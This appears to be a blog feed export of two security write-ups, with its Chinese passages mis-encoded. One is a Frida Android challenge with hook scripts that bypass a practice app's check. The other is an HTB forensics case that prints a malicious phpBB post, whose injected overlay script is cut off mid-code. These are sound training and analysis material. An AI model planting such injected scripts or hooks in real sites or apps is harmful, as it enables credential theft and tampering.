class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x1;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.text.TextUtils;<br><span class="hljs-keyword">import</span> android.view.View.OnClickListener;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    TextView t1;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">check</span><span class="hljs-params">(<span class="hljs-type">int</span> v, <span class="hljs-type">int</span> v1)</span> &#123;<br>        <span class="hljs-keyword">if</span>(v * <span class="hljs-number">2</span> + <span class="hljs-number">4</span> == v1) &#123;<br>            Toast.makeText(<span class="hljs-built_in">this</span>.getApplicationContext(), <span class="hljs-string">&quot;Yey you guessed it right&quot;</span>, <span class="hljs-number">1</span>).show();<br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">stringBuilder0</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; v2 &lt; <span class="hljs-number">20</span>; ++v2) &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">v3</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AMDYV&#123;WVWT_CJJF_0s1&#125;&quot;</span>.charAt(v2);<br>                <span class="hljs-keyword">if</span>(v3 &gt;= <span class="hljs-number">97</span> &amp;&amp; v3 &lt;= <span class="hljs-number">0x7A</span>) &#123;<br>                    v3 = (<span class="hljs-type">char</span>)(v3 - <span class="hljs-number">21</span>);<br>                    <span class="hljs-keyword">if</span>(v3 &lt; <span class="hljs-number">97</span>) &#123;<br>                        v3 = (<span class="hljs-type">char</span>)(v3 + <span class="hljs-number">26</span>);<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(v3 &gt;= <span class="hljs-number">65</span> &amp;&amp; v3 &lt;= <span class="hljs-number">90</span>) &#123;<br>                    v3 = (<span class="hljs-type">char</span>)(v3 - <span class="hljs-number">21</span>);<br>                    <span class="hljs-keyword">if</span>(v3 &lt; <span class="hljs-number">65</span>) &#123;<br>                        v3 = (<span class="hljs-type">char</span>)(v3 + <span class="hljs-number">26</span>);<br>                    &#125;<br>                &#125;<br><br>                stringBuilder0.append(((<span class="hljs-type">char</span>)v3));<br>            &#125;<br><br>            <span class="hljs-built_in">this</span>.t1.setText(stringBuilder0.toString());<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        Toast.makeText(<span class="hljs-built_in">this</span>.getApplicationContext(), <span class="hljs-string">&quot;Try again&quot;</span>, <span class="hljs-number">1</span>).show();<br>    &#125;<br><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">get_random</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">100</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// androidx.fragment.app.FragmentActivity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle bundle0)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(bundle0);<br>        <span class="hljs-built_in">this</span>.setContentView(layout.activity_main);<br>        <span class="hljs-type">EditText</span> <span class="hljs-variable">editText0</span> <span class="hljs-operator">=</span> (EditText)<span class="hljs-built_in">this</span>.findViewById(id.editTextTextPassword);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">button0</span> <span class="hljs-operator">=</span> (Button)<span class="hljs-built_in">this</span>.findViewById(id.button);<br>        <span class="hljs-built_in">this</span>.t1 = (TextView)<span class="hljs-built_in">this</span>.findViewById(id.textview1);<br>        button0.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// android.view.View$OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view0)</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> editText0.getText().toString();<br>                <span class="hljs-keyword">if</span>(TextUtils.isDigitsOnly(s)) &#123;<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">v</span> <span class="hljs-operator">=</span> Integer.parseInt(s);<br>                    MainActivity.<span class="hljs-built_in">this</span>.check(<span class="hljs-built_in">this</span>.get_random(), v);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>.getApplicationContext(), <span class="hljs-string">&quot;Enter a valid number !!&quot;</span>, <span class="hljs-number">1</span>).show();<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Oncreate-æ–¹æ³•"><a href="#Oncreate-æ–¹æ³•" class="headerlink" title="Oncreate() æ–¹æ³•"></a>Oncreate() æ–¹æ³•</h2><p>åœ¨ <code>onCreate()</code> æ–¹æ³•ä¸­æ·»åŠ äº†ä¸€ä¸ªäº‹ä»¶ç›‘å¬å™¨ <code>Button</code>ï¼Œå½“è¢«ç‚¹å‡»çš„æ—¶å€™ä¼šè°ƒç”¨ <code>onClick()</code>æ–¹æ³•ï¼Œ<code>onClick()</code> æ–¹æ³•ä¸­è·å–è¾“å…¥çš„æ–‡æœ¬ï¼ŒéªŒè¯æ˜¯å¦æ˜¯æ•°å­—ï¼Œå¦‚æœæ˜¯æ•°å­—å°±è°ƒç”¨ <code>check()</code> æ–¹æ³•è¿›è¡ŒéªŒè¯</p><p><img src="https://img.dkdun.cn/v1/2025/12/dc492a0c288a9b3c.png"></p><h2 id="check-æ–¹æ³•"><a href="#check-æ–¹æ³•" class="headerlink" title="check() æ–¹æ³•"></a>check() æ–¹æ³•</h2><p><code>get_random()</code> æ–¹æ³•ä¸ºäº†æ‰¾éšæœºæ•°ï¼Œ<code>check()</code> æ–¹æ³•æ£€æŸ¥è¾“å…¥æ˜¯å¦èƒ½å¤Ÿæ»¡è¶³ <code>v*2 + 4 == v1</code>ï¼Œå¦‚æœæ»¡è¶³åˆ™å°† flag è¾“å‡º</p><p><img src="https://img.dkdun.cn/v1/2025/12/3e8cab3ad35829be.png"></p><p>æ‰€ä»¥ç°åœ¨æ˜ç™½æµç¨‹ï¼šè¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œå¦‚æœä¸éšæœºæ•°ç¬¦åˆåˆ™è¾“å‡º flag</p><h1 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h1><h2 id="hook-get-random-æ–¹æ³•"><a href="#hook-get-random-æ–¹æ³•" class="headerlink" title="hook get_random() æ–¹æ³•"></a>hook get_random() æ–¹æ³•</h2><p>æœ€ç®€å•çš„å°±æ˜¯å» hook è¿™ä¸ªéšæœºæ•°çš„å€¼ï¼Œhook ä»£ç å¦‚ä¸‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook1</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">get_random</span>.<span class="hljs-property">implementation</span>=<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br><br>        <span class="hljs-keyword">var</span> num=<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">get_random</span>();<span class="hljs-comment">// è·å– get_random å€¼</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;value:&quot;</span>,num); <span class="hljs-comment">//æ‰“å°</span><br>        <span class="hljs-keyword">return</span> num;<span class="hljs-comment">//è¿”å› hook çš„å€¼</span><br>    &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook1</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>ä¿å­˜å¥½åè¿è¡Œï¼Œå› ä¸º <code>get_random()</code> æ–¹æ³•åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±å·²ç»åŠ è½½å®Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨å®ƒåŠ è½½ä¹‹å‰å°±æ³¨å…¥è¿›å»ï¼ŒåŠ ä¸Š <code>--no-pause</code> ç¡®ä¿åº”ç”¨å¯åŠ¨åä¸ä¼šæš‚åœ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">frida -U -f com.ad2001.frida0x1 -l .\hook1.js --no-<span class="hljs-built_in">pause</span><br></code></pre></td></tr></table></figure><p>è¿”å›å€¼ä¸º 33ï¼Œåˆ™åº”è¯¥è¾“å…¥ 33*2 + 4 &#x3D;70</p><p><img src="https://img.dkdun.cn/v1/2025/12/626386fe438d40b5.png"></p><h2 id="hook-get-random-æ–¹æ³•æŒ‡å®šå€¼"><a href="#hook-get-random-æ–¹æ³•æŒ‡å®šå€¼" class="headerlink" title="hook get_random() æ–¹æ³•æŒ‡å®šå€¼"></a>hook get_random() æ–¹æ³•æŒ‡å®šå€¼</h2><p>hook <code>get_random()</code>æ–¹æ³•ç„¶åæŒ‡å®šéšæœºæ•°çš„å€¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook1</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">get_random</span>.<span class="hljs-property">implementation</span>=<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">6</span>;<span class="hljs-comment">//æŒ‡å®šéšæœºæ•°çš„å€¼ä¸º 6</span><br>    &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook1</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>ç›´æ¥è¾“å…¥ 16 èƒ½å¾—å‡ºç»“æœ</p><p><img src="https://img.dkdun.cn/v1/2025/12/7a4b9830521d1329.png"></p><h2 id="hook-check-æ–¹æ³•"><a href="#hook-check-æ–¹æ³•" class="headerlink" title="hook check() æ–¹æ³•"></a>hook check() æ–¹æ³•</h2><p>å‘½ä»¤å¯ä»¥ä¸ç”¨åŠ ä¸Š <code>--no-pause</code>ï¼Œå› ä¸º <code>check()</code> å‡½æ•°æ˜¯åœ¨ç¨‹åºåˆå§‹åŒ–ä¹‹åæ‰è¿è¡Œçš„ï¼Œä¸éœ€è¦åœ¨åŠ è½½æ—¶æ³¨å…¥äº†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook1</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">check</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;int&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>).<span class="hljs-property">implementation</span>=<span class="hljs-keyword">function</span> (<span class="hljs-params">a,b</span>)&#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">check</span>(a,a*<span class="hljs-number">2</span>+<span class="hljs-number">4</span>);<span class="hljs-comment">//è°ƒç”¨åŸå§‹æ–¹æ³•ï¼Œå¼ºåˆ¶ç¬¬äºŒä¸ªå‚æ•°ä¸º a*2 +4</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook1</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™éšä¾¿è¾“å…¥ä¸€ä¸ªèŒƒå›´å†…çš„æ•°å­—éƒ½èƒ½å¾—å‡ºç»“æœ</p><p><img src="https://img.dkdun.cn/v1/2025/12/d3ccafd1195e05be.png"></p><p>Challenge 0x1 over ^__^~</p>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
      <category>Frida</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Andriod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Bumblebee</title>
    <link href="/2025/03/26/HTB-Bumblebee/"/>
    <url>/2025/03/26/HTB-Bumblebee/</url>
    
    <content type="html"><![CDATA[<p>Levelï¼šEasy</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.</p><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><p>æŸ¥çœ‹ <code>access.log</code> ï¼Œå‘ç°  <code>10.10.0.78</code> æˆåŠŸç™»å½•ï¼Œå¾€ä¸‹çœ‹å‘ç° <code>10.255.254.2</code> ç™»å½•æˆåŠŸå¹¶è¿›å…¥äº†ç®¡ç†é¡µé¢ï¼ˆ<code>adm</code>ï¼‰ã€‚å› æ­¤çŒœæµ‹<code>10.10.0.78</code> æ˜¯æ‰¿åŒ…å•†ï¼Œ<code>10.255.254.2</code>æ˜¯çœŸæ­£çš„ç®¡ç†å‘˜</p><p><img src="https://img.dkdun.cn/v1/2025/12/66db6ac120a3b296.png"></p><p>ä½¿ç”¨åœ¨çº¿ <a href="https://sqliteviewer.app/">SQLite æŸ¥çœ‹å™¨</a> æŸ¥çœ‹ <code>phpbb.sqlite3</code> æ–‡ä»¶ï¼Œå‘ç°æœ‰ä¸¤ä¸ªç”¨æˆ·</p><p><img src="https://img.dkdun.cn/v1/2025/12/eeefa4977b541cb6.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What was <span class="hljs-keyword">the</span> username <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> external contractor?<br>:apoole1<br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">What IP <span class="hljs-selector-tag">address</span> did the contractor <span class="hljs-selector-tag">use</span> <span class="hljs-selector-tag">to</span> create their account?<br>:<span class="hljs-number">10.10</span>.<span class="hljs-number">0.78</span><br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p>å» <code>phpbb_posts</code> é‡ŒæŸ¥çœ‹ IP <code>10.10.0.78</code> çš„ <code>post_id</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/9f6b475ffc45e94c.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> post_id <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> malicious <span class="hljs-built_in">post</span> that <span class="hljs-keyword">the</span> contractor made?<br>:<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>å‘ç° <code>phpbb_posts</code> è¿˜æœ‰ <code>post_text</code> å­—æ®µ</p><p><img src="https://img.dkdun.cn/v1/2025/12/c8849b629884a6dc.png"></p><p>ä½¿ç”¨ linux çš„ sqlite3 æŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">pragma table_info(phpbb_users);<br>select post_text from phpbb_posts;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/0d85b6f1704381e5.png"></p><p>å‘ç°æ˜¯ç½‘é¡µï¼Œæ•´ç†ä¸€ä¸‹å§</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><code class="hljs html">This is an example post in your phpBB3 installation. Everything seems to be working. You may delete this post if you like and continue to set up your board. During the installation process your first category and your first forum are assigned an appropriate set of permissions for the predefined usergroups administrators, bots, global moderators, guests, registered users and registered COPPA users. If you also choose to delete your first category and your first forum, do not forget to assign permissions for all these usergroups for all new categories and forums you create. It is recommended to rename your first category and your first forum and copy permissions from these while creating new categories and forums. Have fun!<br><span class="hljs-tag">&lt;<span class="hljs-name">t</span>&gt;</span>Good Afternoon everyone!<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>I am new to the administration team here at forela, I&#x27;d like to take a minute and say hello!<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>I have 5 years of administration experience and am ecstatic to be joining this team<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>Regards,<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>Randy<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"><span class="hljs-selector-tag">body</span> &#123;    <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;&#125;<span class="hljs-selector-class">.modal</span> &#123;    <span class="hljs-attribute">position</span>:fixed;    <span class="hljs-attribute">top</span>:<span class="hljs-number">0</span>;    <span class="hljs-attribute">left</span>:<span class="hljs-number">0</span>;    <span class="hljs-attribute">height</span>:<span class="hljs-number">100%</span>;    <span class="hljs-attribute">width</span>:<span class="hljs-number">100%</span>;    <span class="hljs-attribute">z-index</span>:<span class="hljs-number">101</span>;    <span class="hljs-attribute">background-color</span>:white;    <span class="hljs-attribute">opacity</span>:<span class="hljs-number">1</span>;&#125;<span class="hljs-selector-class">.modal</span><span class="hljs-selector-class">.hidden</span> &#123;    <span class="hljs-attribute">visibility</span>: hidden;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sethidden</span>(<span class="hljs-params"></span>)&#123;    <span class="hljs-keyword">const</span> d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();    d.<span class="hljs-title function_">setTime</span>(d.<span class="hljs-title function_">getTime</span>() + (<span class="hljs-number">24</span>*<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">1000</span>));    <span class="hljs-keyword">let</span> expires = <span class="hljs-string">&quot;expires=&quot;</span>+ d.<span class="hljs-title function_">toUTCString</span>();    <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;phpbb_token=1;&quot;</span> + expires + <span class="hljs-string">&quot;;&quot;</span>;    <span class="hljs-keyword">var</span> modal = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;zbzbz1234&#x27;</span>);    modal.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&quot;hidden&quot;</span>);&#125;<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;DOMContentLoaded&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;    <span class="hljs-keyword">let</span> cookieexists = <span class="hljs-literal">false</span>;    <span class="hljs-keyword">let</span> name = <span class="hljs-string">&quot;phpbb_token=&quot;</span>;    <span class="hljs-keyword">let</span> cookies = <span 